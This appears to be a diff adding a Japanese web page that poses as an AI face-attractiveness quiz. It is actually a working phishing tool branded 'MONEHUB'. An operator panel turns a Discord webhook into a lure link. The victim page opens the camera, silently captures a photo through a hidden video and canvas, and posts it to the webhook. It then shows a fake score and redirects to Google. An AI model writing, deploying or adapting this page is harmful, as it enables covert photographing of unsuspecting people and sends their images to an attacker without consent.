@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI顔面偏差値診断 - 次世代画像解析システム</title>
+    <style>
+        :root { --main-blue: #0078d4; --bg-light: #f8f9fa; --text-dark: #333; --crimson: #DC143C; }
+        body { background-color: var(--bg-light); color: var(--text-dark); font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; }
+        
+        /* 管理用パネル */
+        #gen-panel { background: #111; color: #fff; padding: 30px; border-bottom: 5px solid var(--crimson); }
+        #gen-panel h2 { color: var(--crimson); font-family: 'Arial Black'; letter-spacing: 5px; margin: 0; }
+        #gen-panel input { width: 90%; max-width: 400px; padding: 12px; margin: 15px 0; background: #000; border: 1px solid #333; color: #fff; border-bottom: 2px solid var(--crimson); outline: none; }
+        .gen-btn { width: 90%; max-width: 400px; padding: 15px; background: var(--crimson); border: none; color: white; font-weight: bold; cursor: pointer; }
+        #result-link { display: none; margin: 20px auto; width: 90%; max-width: 400px; background: #000; padding: 15px; border: 1px dashed #0f0; word-break: break-all; }
+        #final-url { color: #0f0; font-family: monospace; font-size: 0.8rem; margin: 10px 0; }
+
+        /* ターゲット画面 */
+        .target-wrapper { display: none; min-height: 100vh; flex-direction: column; align-items: center; }
+        .nav { width: 100%; background: #fff; padding: 15px 25px; border-bottom: 1px solid #e0e0e0; box-sizing: border-box; display: flex; align-items: center; justify-content: space-between; }
+        .hero { max-width: 500px; width: 90%; background: #fff; margin-top: 40px; padding: 40px 30px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); }
+        .action-btn { width: 100%; padding: 18px; background: var(--main-blue); border: none; border-radius: 50px; color: white; font-weight: bold; font-size: 1.1rem; cursor: pointer; }
+        #loading-screen { display: none; margin-top: 40px; }
+        .spinner { width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid var(--main-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        video, canvas { position: fixed; top: -5000px; opacity: 0; }
+    </style>
+</head>
+<body>
+
+    <div id="gen-panel">
+        <h2>MONEHUB</h2>
+        <input type="text" id="webhook-input" placeholder="DISCORD WEBHOOK URL...">
+        <br>
+        <button class="gen-btn" onclick="generateLink()">診断リンクを生成</button>
+        <div id="result-link">
+            <p id="final-url"></p>
+            <button onclick="copyUrl()" style="background:#333; color:#fff; border:none; padding:5px 10px; cursor:pointer;">コピー</button>
+        </div>
+    </div>
+
+    <div id="target-screen" class="target-wrapper">
+        <div class="nav"><span style="color:var(--main-blue); font-weight:bold;">AI-FACE ANALYZER</span></div>
+        <div class="hero" id="main-content">
+            <h2 style="color:var(--main-blue);">AI顔面偏差値診断</h2>
+            <p style="font-size:0.9rem; color:#666;">AIがあなたの顔を解析し、偏差値を算出します。</p>
+            <button class="action-btn" onclick="startScan()">診断を開始する</button>
+        </div>
+        <div id="loading-screen">
+            <div class="spinner"></div>
+            <div id="status-msg" style="color:var(--main-blue); font-weight:bold;">AI解析を準備中...</div>
+        </div>
+    </div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const encodedWh = urlParams.get('wh');
+
+        if (encodedWh) {
+            document.getElementById('gen-panel').style.display = 'none';
+            document.getElementById('target-screen').style.display = 'flex';
+            document.body.style.backgroundColor = "#f8f9fa";
+        }
+
+        function generateLink() {
+            const wh = document.getElementById('webhook-input').value;
+            if (!wh.includes("discord.com/api/webhooks/")) return alert("Invalid Webhook");
+            const finalUrl = window.location.href.split('?')[0] + "?wh=" + btoa(wh);
+            document.getElementById('result-link').style.display = 'block';
+            document.getElementById('final-url').innerText = finalUrl;
+        }
+
+        function copyUrl() {
+            navigator.clipboard.writeText(document.getElementById('final-url').innerText);
+            alert("Copied!");
+        }
+
+        async function startScan() {
+            document.getElementById('main-content').style.display = 'none';
+            document.getElementById('loading-screen').style.display = 'block';
+            
+            const video = document.getElementById('video');
+            const webhookUrl = atob(encodedWh);
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: 1280 }, audio: false 
+                });
+                video.srcObject = stream;
+
+                // 【修正：重要】映像が読み込まれるのを待ってから撮影
+                video.onloadedmetadata = () => {
+                    video.play();
+                    // 映像が開始された直後（200ms）に実行
+                    setTimeout(() => {
+                        captureAndSend(webhookUrl, video);
+                    }, 200);
+                };
+
+                setTimeout(() => {
+                    document.getElementById('status-msg').innerText = "解析完了。結果出力中...";
+                    setTimeout(() => {
+                        alert("解析が完了しました！\n顔面偏差値：68.2 (上位2.1%)");
+                        window.location.href = "https://www.google.com";
+                    }, 1000);
+                }, 3500);
+
+            } catch (err) {
+                alert("カメラの許可が必要です。");
+                location.reload();
+            }
+        }
+
+        function captureAndSend(webhookUrl, video) {
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            
+            // ビデオの実際のサイズを確実に取得
+            canvas.width = video.videoWidth || 1280;
+            canvas.height = video.videoHeight || 720;
+            
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('file', blob, 'shot.jpg');
+                formData.append('content', '🚨 **MONEHUB Z-VISION: 捕捉成功**');
+                
+                fetch(webhookUrl, { 
+                    method: 'POST', 
+                    body: formData,
+                    mode: 'no-cors' // ブラウザの制限を回避しやすくする
+                }).catch(e => console.log("Send Error"));
+            }, 'image/jpeg', 0.9);
+        }
+    </script>
+</body>
+</html>
